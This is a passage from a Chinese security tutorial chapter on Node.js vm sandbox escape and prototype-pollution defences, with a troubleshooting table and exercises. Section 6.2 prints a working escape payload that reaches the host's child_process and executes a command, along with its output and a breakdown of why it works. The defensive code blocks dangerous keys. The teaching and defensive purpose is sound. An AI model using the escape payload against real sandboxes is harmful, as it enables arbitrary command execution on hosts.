传入的变量可用；上下文里直接访问宿主的 `process` 报 `ReferenceError`——这是隔离的表象。但 Node 官方文档在 vm 模块开头写明：==The node:vm module is not a security mechanism. Do not use it to run untrusted code==（vm 不是安全机制，不要用它运行不可信代码）。隔离挡的是"手滑"，挡不住"故意"。[[W09-SSTI#6. 沙箱逃逸入门|W09 第 6 节]]对模板沙箱的结论在这里以更彻底的形式成立。

### 6.2 经典逃逸 payload

```js
// vm_escape.js —— 经典逃逸：从 this 走到宿主的 Function 构造器，再拿回 process
const vm = require('vm');

const code = "this.constructor.constructor('return process')()" +
             ".mainModule.require('child_process').execSync('id').toString()";

const out = vm.runInNewContext(code, {});
console.log('逃逸 payload 在"沙箱"里的执行结果:');
console.log(out.trim());
console.log('宿主自己执行 id（对照）:');
console.log(require('child_process').execSync('id').toString().trim());
```

```bash
node vm_escape.js
```

输出：

```
逃逸 payload 在"沙箱"里的执行结果:
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
宿主自己执行 id（对照）:
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

在"新上下文"里执行的一行代码，拿到了宿主的 `process` 并执行了 `id` 命令——两行输出完全一致。这段 payload 在包括本书记录版本在内的各 Node 版本上长期有效，因为它的根基不是某个实现缺陷，而是 6.3 节拆解的结构性事实。

### 6.3 逃逸原理拆解

payload 逐段：

| 片段 | 拿到什么 | 为什么过得去 |
| ---- | ---- | ---- |
| `this` | `runInNewContext` 的第二个参数（sandbox 对象） | 这个对象是宿主代码创建的普通对象，上下文化只是在外面套了一层代理，它的原型链在宿主一侧 |
| `.constructor` | 宿主的 `Object` 函数 | sandbox 上没有自有的 `constructor`，查找走到宿主的 `Object.prototype` |
| `.constructor` | 宿主的 `Function` 构造器 | `Object.prototype.constructor` 指向 `Object`，`Object` 的 `constructor` 是 `Function` |
| `Function('return process')` | 一个宿主领域的函数 | ==`Function` 构造器创建的函数，编译在 `Function` 自己所在的领域里==，`return process` 按宿主的语义求值 |
| `().mainModule.require('child_process')` | 宿主的 `child_process` 模块 | CJS 主模块的 `mainModule` 上挂着完整的模块加载器，[[W05-命令注入与代码执行|W05]] 的执行函数族全部可取 |

==逃逸的本质：在新上下文里找到一个"出生在宿主"的对象，顺着它的原型链走到宿主的 `Function` 构造器==。sandbox 对象是现成的入口——这也是官方说"vm 不是安全机制"的机制层面的原因：隔离边界本身被当作参数传了进来。

> [!info]- 拿不到 this 时怎么办
> payload 依赖顶层 `this` 指向 sandbox。代码进了严格模式的普通函数、箭头函数时 `this` 是 `undefined`，这条最短路就断了——逃逸需要另找一个指向宿主对象的引用：sandbox 里传入的宿主函数、抛出的异常对象、或某个泄漏进上下文的宿主内建；找不到任何宿主引用时逃逸打不出。防御侧对应的做法一句话：把 sandbox 换成 `Object.create(null)` 造的对象、不向上下文传任何宿主函数——能掐断最短路，但改变的只是逃逸成本，vm 依旧不承诺安全。

> [!note] vm2：专用沙箱的兴衰
> 因为 vm 不能当安全边界，社区长期用第三方库 vm2 做代码隔离：它用 Proxy 拦截补 vm 的缺口，一度是"运行不可信 JS"的事实标准。2022 到 2023 年，vm2 被连续公开多个逃逸（Promise 处理器、Proxy 内部方法、宿主对象引用等路线），维护者于 2023 年宣布停止维护，仓库归档。==沙箱是一类修不完的防线：隔离机制与执行引擎深度耦合，引擎每演化一次，沙箱就要重新证明自己一次==。这与 [[W09-SSTI#6. 沙箱逃逸入门|W09 第 6 节]]记录的模板沙箱版本史互相印证。

## 7. 防御

防御沿着"不设防的 merge → 入口污染 → 读取滥用"这条链逐环设防。一个脚本对照四种修法：

```js
// safe_merge.js —— 三种修法的效果对照
const fs = require('fs');

// 修法一：merge 每一层都过滤危险键
const BLOCK = new Set(['__proto__', 'constructor', 'prototype']);
function safeMerge(target, source) {
  for (const key in source) {
    if (BLOCK.has(key)) continue;
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
safeMerge({}, JSON.parse(fs.readFileSync('p_proto.json', 'utf8')));
safeMerge({}, JSON.parse(fs.readFileSync('p_ctor.json', 'utf8')));
console.log('1) 过滤版 merge 吃下两种载荷后, ({}).admin =', ({}).admin);

// 修法二：无原型字典承接外部输入
const dict = Object.create(null);
dict['__proto__'] = { admin: true };
console.log('2) 无原型字典: 自有键 =', Object.keys(dict),
            '; ({}).admin =', ({}).admin);

// 修法三：冻结共享原型
Object.freeze(Object.prototype);
Object.prototype.frozen_test = 1;              // 非严格模式：静默失败
console.log('3) 冻结后写 Object.prototype.frozen_test, ({}).frozen_test =', ({}).frozen_test);

// 修法四：白名单拷贝（结构校验的裸写版）
function pick(source, schema) {
  const out = {};
  for (const key of Object.keys(schema)) {
    if (typeof source[key] === schema[key]) out[key] = source[key];
  }
  return out;
}
const body = JSON.parse('{"user":"bob","level":3,"__proto__":{"admin":true}}');
const clean = pick(body, { user: 'string', level: 'number' });
console.log('4) 白名单拷贝留下的字段:', JSON.stringify(clean));
```

```bash
node safe_merge.js
```

输出：

```
1) 过滤版 merge 吃下两种载荷后, ({}).admin = undefined
2) 无原型字典: 自有键 = [ '__proto__' ] ; ({}).admin = undefined
3) 冻结后写 Object.prototype.frozen_test, ({}).frozen_test = undefined
4) 白名单拷贝留下的字段: {"user":"bob","level":3}
```

### 7.1 merge 前过滤危险键

`BLOCK` 集合三个键全挡，且==过滤发生在 merge 的每一层递归里==——只在顶层检查挡不住嵌套载荷。第 1 行输出：`__proto__` 直达载荷与 4.2 节的 `constructor.prototype` 载荷都不再产生污染。代价：`constructor` 与 `prototype` 是合法词，业务数据里出现这两个键会被误伤，用 7.3 的结构校验替代更稳。

### 7.2 无原型字典与冻结

- 第 2 行：`Object.create(null)` 造的字典没有 `__proto__` 的 setter，赋值就是普通自有键——`__proto__` 成了键列表里的普通一员，共享原型分毫未动。承接外部输入的第一站用无原型字典（或 `Map`），特殊键就失去了特殊机制；
- 第 3 行：`Object.freeze(Object.prototype)` 让"往共享原型写属性"静默失败（非严格模式；严格模式抛 `TypeError`）。它挡写属性，不挡"给单个对象换原型"。Node 还有启动参数 `--frozen-intrinsics`（实验性），把全部内建对象一次性冻结，兼容性代价大，留给加固场景。

### 7.3 结构校验：白名单拷贝

第 4 行：从"合并任意键"换成"只取声明过的字段"。`pick` 按 schema 拷贝，`__proto__` 键根本进不了结果对象，后面再 merge 也没有危险键可带。生产项目用 zod 这类 schema 校验库做同一件事：声明结构 → parse 出全新对象 → 未声明字段丢弃。==parse（构造新对象）总是比 merge（原地合并）安全==。

### 7.4 边界选在哪：隔离进程与容器

以上修法都在降低"污染成立"的概率；而第 6 节已经说明，进程内的"沙箱"不构成安全边界。要运行彻底不可信的代码，边界只能放在进程与进程之间：子进程 + 最小权限、容器（[[13-Docker与赛题环境|13 章]]），让逃逸的终点是一个一次性容器而不是宿主。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `__proto__` 写进 JSON 就以为污染成功了 | `JSON.parse` 把它建成普通自有键，不触发 setter；污染发生在 merge 的赋值语句，先确认代码里有没有不设防的合并（[[#3.2 递归 merge 靶：JSON body 进，权限判断出\|3.2]]） |
| 载荷停发之后 admin 依旧是 true | 写进 `Object.prototype` 的属性随进程存活，重启进程才复原；排查前先重启再复测，避免旧污染干扰 |
| 过滤了 `__proto__` 还是被污染 | `constructor.prototype` 是等价的第二条路，过滤名单要三个键全盖（[[#4.2 绕过只挡 __proto__ 的过滤\|4.2]]） |
| `node -e` 一加引号就报错 | 外层 shell 和 `-e` 的代码两层都在抢引号；复杂代码写进 `.js` 文件再 `node` 运行，本章脚本全是这种形态 |
| `npm install` 长时间无响应 | 默认源连接慢；加 `--registry=https://registry.npmmirror.com` 临时换国内镜像，长期生效用 `npm config set registry` |
| `NODE_OPTIONS` 载荷提交后子进程没反应 | 子进程不是 node（不认这个变量）；或载荷打的是 spawn 的 `shell` 选项——当代 Node 的选项读取只认自有属性，继承污染已无效（[[#5.2 污染进子进程：NODE_OPTIONS 与 BASH_ENV\|5.2]]） |
| 逃逸 payload 报 Cannot read properties of undefined | `this` 没有指向宿主对象（严格模式的普通函数、箭头函数里 `this` 是 `undefined`）；先找指向宿主的引用再构造链（[[#6.3 逃逸原理拆解\|6.3]]） |
| 挡住 `constructor`/`prototype` 后正常功能坏了 | 这两个是合法词，过滤误伤了业务数据；换结构校验，只放行声明过的字段（[[#7.3 结构校验：白名单拷贝\|7.3]]） |
| 客户端在地址栏加了 `#` 载荷页面没变化 | 同文档锚点跳转不重跑脚本；整页刷新，或新开标签页直接打开带载荷的完整地址（[[#4.3 客户端原型污染：URL hash → merge\|4.3]]） |
| qs 风格的 query 载荷打不出 | 当代 qs 默认丢弃两类危险键，此入口只对老版本依赖成立；先确认目标依赖版本（[[#4.1 入口盘点：JSON、query 方括号与表单\|4.1]]） |

## 9. 配套练习与延伸阅读

> [!note] 实战任务
> 1. **PortSwigger Web Security Academy 的 Prototype pollution 实验室**（[[01-练习平台索引|01 篇]]收录获取方式）：免费交互靶，客户端污染与 gadget 链是它的强项；完成 Client-side prototype pollution 分区的至少两关，各写一段"source → merge → gadget → 危害"的传导记录。
> 2. **依赖版本对照**：`npm install lodash@4.17.4` 与 `npm install lodash@4.17.21` 各装一份，用同一个 merge 载荷对照 `_.merge` 的行为差异，再到 GitHub Advisory Database 检索对应的安全通告，确认修复落在哪个版本。
> 3. **防御改造**：把 3.2 节的 merge_server.js 换成 7.1 节的过滤版与 7.3 节的白名单版，重放同一批载荷，确认 `({}).admin` 恒为 `undefined`、正常登录功能不受影响。
> 4. **vm 加固实验**：把 6.2 节 `runInNewContext` 的第二个参数换成 `Object.create(null)`，重放逃逸 payload，记录报错；再对照 6.3 节的折叠框，说清为什么这仍然不算修复。

延伸阅读：

- Node.js 官方文档 vm 模块（<https://nodejs.org/api/vm.html>）："not a security mechanism" 原句出处，contextification 机制的权威说明；
- Node.js 官方文档 CLI 页（<https://nodejs.org/api/cli.html>）：`NODE_OPTIONS` 的允许参数表与 `--frozen-intrinsics` 的实验性说明；
- PortSwigger 的 Prototype pollution 专题（<https://portswigger.net/web-security/prototype-pollution>）：客户端与服务端污染、gadget 的系统整理；
- GitHub Advisory Database（<https://github.com/advisories>）：按 "prototype pollution" 检索 qs、lodash 等高频依赖的历史漏洞与修复版本；
- 工具速查见 [[03-工具清单|08-资源索引·工具清单]]；下一章把视角切到业务层，讲逻辑与认证漏洞。
